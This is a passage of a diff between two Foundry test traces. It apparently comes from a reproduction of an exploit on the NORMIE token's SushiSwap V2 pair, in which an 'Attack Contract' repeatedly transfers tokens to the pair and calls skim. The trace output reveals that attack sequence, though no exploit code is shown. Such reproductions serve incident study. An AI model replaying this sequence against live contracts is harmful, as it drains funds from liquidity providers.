+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000072ad68e95e2ad → 0x000000000000000000000000000000000000000000000000000f38531542987c
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001a12f690c2a3a34 → 0x000000000000000000000000000000000000000000000000019921ec857d8465
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2466,9 +2374,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
-    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001745cf9bef4e4b → 0x00000000000000000000000000000000000000000000000000071b9c2e34ee4b
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000019921ec857d8465 → 0x00000000000000000000000000000000000000000000000001a94c1ff337e465
+    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001745cf9bef4e4b → 0x00000000000000000000000000000000000000000000000000071b9c2e34ee4b
+    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 23070764031225890378 [2.307e19], 115160565210252389 [1.151e17], 1716694911 [1.716e9]
@@ -2478,8 +2386,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 874350522978952979 [8.743e17])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 874350522978952979 [8.743e17])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000000c22512b0b566713
     │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x000000000000000000000000000000000000000000000001402bd1a6fa14064a → 0x0000000000000000000000000000000000000000000000013409807beebd9f37
+    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000000c22512b0b566713
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 22196413508246937399 [2.219e19]
@@ -2512,8 +2420,8 @@ Traces:
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001a94c1ff337e465 → 0x00000000000000000000000000000000000000000000000001b1599c79e49a34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001a94c1ff337e465 → 0x00000000000000000000000000000000000000000000000001b1599c79e49a34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -2528,9 +2436,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000071b9c2e34ee4b → 0x000000000000000000000000000000000000000000000000000f2918b4e1a41a
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001b1599c79e49a34 → 0x00000000000000000000000000000000000000000000000001a94c1ff337e465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000071b9c2e34ee4b → 0x000000000000000000000000000000000000000000000000000f2918b4e1a41a
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2571,8 +2479,8 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001a94c1ff337e465 → 0x00000000000000000000000000000000000000000000000001b9765360f24465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001a94c1ff337e465 → 0x00000000000000000000000000000000000000000000000001b9765360f24465
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001736953b8e59e9 → 0x00000000000000000000000000000000000000000000000000070c61cdd3f9e9
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
@@ -2616,9 +2524,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001b9765360f24465 → 0x00000000000000000000000000000000000000000000000001c183cfe79efa34
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001b9765360f24465 → 0x00000000000000000000000000000000000000000000000001c183cfe79efa34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -2633,8 +2541,8 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001c183cfe79efa34 → 0x00000000000000000000000000000000000000000000000001b9765360f24465
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000070c61cdd3f9e9 → 0x000000000000000000000000000000000000000000000000000f19de5480afb8
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
@@ -2659,8 +2567,8 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f19de5480afb8 → 0x0000000000000000000000000000000000000000000000000017275adb2d6587
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001c183cfe79efa34 → 0x00000000000000000000000000000000000000000000000001b9765360f24465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f19de5480afb8 → 0x0000000000000000000000000000000000000000000000000017275adb2d6587
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
@@ -2676,9 +2584,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
-    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017275adb2d6587 → 0x0000000000000000000000000000000000000000000000000006fd276d730587
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001b9765360f24465 → 0x00000000000000000000000000000000000000000000000001c9a086ceaca465
+    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017275adb2d6587 → 0x0000000000000000000000000000000000000000000000000006fd276d730587
+    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 21386005457087310896 [2.138e19], 124260565210252389 [1.242e17], 1716694911 [1.716e9]
@@ -2764,9 +2672,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f0aa3f41fbb56 → 0x000000000000000000000000000000000000000000000000001718207acc7125
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001d1ae0355595a34 → 0x00000000000000000000000000000000000000000000000001c9a086ceaca465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f0aa3f41fbb56 → 0x000000000000000000000000000000000000000000000000001718207acc7125
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2781,9 +2689,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
-    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001718207acc7125 → 0x0000000000000000000000000000000000000000000000000006eded0d121125
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001c9a086ceaca465 → 0x00000000000000000000000000000000000000000000000001d9caba3c670465
+    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001718207acc7125 → 0x0000000000000000000000000000000000000000000000000006eded0d121125
+    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 20632769980159245777 [2.063e19], 128810565210252389 [1.288e17], 1716694911 [1.716e9]
@@ -2793,8 +2701,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 701909496383304001 [7.019e17])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 701909496383304001 [7.019e17])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000011e5652fad7bc3dd1 → 0x0000000000000000000000000000000000000000000000011498a4030355cc90
     │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x00000000000000000000000000000000000000000000000009bdaef7d4667141
+    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000011e5652fad7bc3dd1 → 0x0000000000000000000000000000000000000000000000011498a4030355cc90
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 19930860483775941776 [1.993e19]
@@ -2869,9 +2777,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001e1d836c313ba34 → 0x00000000000000000000000000000000000000000000000001d9caba3c670465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000efb6993bec6f4 → 0x000000000000000000000000000000000000000000000000001708e61a6b7cc3
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [68746] SushiRouterv2::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2000000000000000000}(0, [0x4200000000000000000000000000000000000006, 0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1716694911 [1.716e9])
@@ -2883,8 +2791,8 @@ Traces:
     │   │   │   ├─ [3001] WETH::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2000000000000000000 [2e18])
     │   │   │   │   ├─ emit Transfer(from: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2000000000000000000 [2e18])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000011498a4030355cc90 → 0x000000000000000000000000000000000000000000000001305a116a521dcc90
     │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0
+    │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000011498a4030355cc90 → 0x000000000000000000000000000000000000000000000001305a116a521dcc90
     │   │   │   │   └─ ← [Return] true
     │   │   │   ├─ [599] NORMIE::balanceOf(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
     │   │   │   │   └─ ← [Return] 2266628300256719 [2.266e15]
@@ -2992,6 +2900,6 @@ Traces:
     │   └─ ← [Stop]
     └─ ← [Stop]
 
-Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.77s (69.77ms CPU time)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.55s (61.21ms CPU time)
 
-Ran 1 test suite in 1.78s (1.77s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+Ran 1 test suite in 1.56s (1.55s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
